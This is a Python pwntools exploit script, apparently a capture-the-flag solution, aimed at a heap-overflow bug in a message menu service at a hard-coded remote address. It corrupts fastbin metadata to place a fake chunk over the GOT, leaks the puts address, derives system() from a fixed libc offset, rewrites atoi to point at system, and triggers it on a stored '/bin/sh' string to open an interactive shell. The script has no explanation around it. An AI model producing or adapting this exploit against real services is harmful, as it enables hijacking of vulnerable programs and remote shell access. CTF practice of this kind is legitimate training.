from pwn import *
from base64 import *

def Read(index, data):
	r.recvuntil('Which? :')
	r.sendline('1')
	r.recvuntil('Which? :')
	r.sendline(str(index))
	r.recvuntil('msg:')
	r.sendline(data)
	
def Edit(index, data):
	r.recvuntil('Which? :')
	r.sendline('2')
	r.recvuntil('Which? :')
	r.sendline(str(index))
	r.recvuntil('new msg:')
	r.sendline(data)
	
def Wipe(index):
	r.recvuntil('Which? :')
	r.sendline('3')
	r.recvuntil('Which? :')
	r.sendline(str(index))
	
addr = 0x60217d-0x10

#r = process('./d')
r = remote('47.75.154.113', 9999)
raw_input('?')

Read(0, b64encode("a"*0x20))

Read(1, b64encode("a"*0x20))

Read(2, b64encode("a"*0x60))

Read(52, b64encode("/bin/sh\x00"*6))

Wipe(0)

Read(0, b64encode("\x60"*0x29)[:-1]) #overwrite next chunk size

payload = "a"*0x28 
payload += p64(0x71) 
Edit(2, payload) #fake next chunk size of 1 

Wipe(1) #free fake chunk
Wipe(2) #free chunk 2

Read(1, b64encode("a"*0x50)) #over fastbins 0x70

payload = p64(0)*5
payload += p64(0x71)
payload += p64(addr)
Edit(1, payload) #create fake fastbins

Read(2, b64encode("a"*0x60)) #trigger

payload = "a"*3
payload += p64(0x602018) #free GOT 0
payload += p64(0x602020) #puts GOT 1
payload += p64(0x602028) #strlen GOT 2
payload += p64(0x602010) #_dl_resole 3
payload += "A"*(0x60-len(payload))

Read(4, b64encode(payload))

Edit(0, p64(0x400770)[:5])

Wipe(1)
tmp = r.recvline().replace('\n', '') + "\x00"*2
puts = u64(tmp)
log.info("puts: %#x" %puts)
"""
Wipe(2)
tmp = r.recvline().replace('\n', '') + "\x00"*2
strlen = u64(tmp)
log.info("strlen: %#x" %strlen)
"""
system = puts - 0x2a300
log.info("system: %#x" %system)

Edit(3, "100");

Edit(2, p64(0x400800)[:5]) #atoi

payload = p64(puts+0x3721e0)
payload += p64(system)

Edit(3, payload[:-1]);

r.recvuntil('Which? :')
r.sendline('3')
r.recvuntil('Which? :')
r.sendline(str(52))

r.interactive()